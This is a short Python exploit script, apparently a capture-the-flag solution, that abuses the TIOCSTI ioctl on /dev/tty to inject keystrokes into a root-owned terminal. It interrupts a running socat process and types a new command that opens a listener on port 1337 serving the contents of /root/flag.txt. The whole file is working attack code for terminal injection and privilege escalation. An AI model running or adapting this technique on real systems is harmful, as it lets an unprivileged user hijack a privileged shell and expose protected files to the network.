import ctypes

libc = ctypes.CDLL('libc.so.6')
open = libc.open
open.argtypes = [ctypes.c_char_p, ctypes.c_int]
open.restype = ctypes.c_int
fd = open(b'/dev/tty', 2)
print(fd)

ioctl = libc.ioctl
ioctl.argtypes = [ctypes.c_int, ctypes.c_int, ctypes.c_char_p]
ioctl.restype = ctypes.c_int
TIOCSTI = 0x5412
# \x03 sends interrupt, closing the socat process
# then we send another socat command so that 1337 will now run that
cmd = '\x03socat TCP-LISTEN:1337,reuseaddr,fork EXEC:\"cat /root/flag.txt\",stderr\n'
for c in cmd:
    try:
        r = ioctl(fd, TIOCSTI, ctypes.c_char_p(c.encode()))
        if r < 0:
            print('ioctl failed')
            break
    except:
        pass

libc.close(fd)
print('done')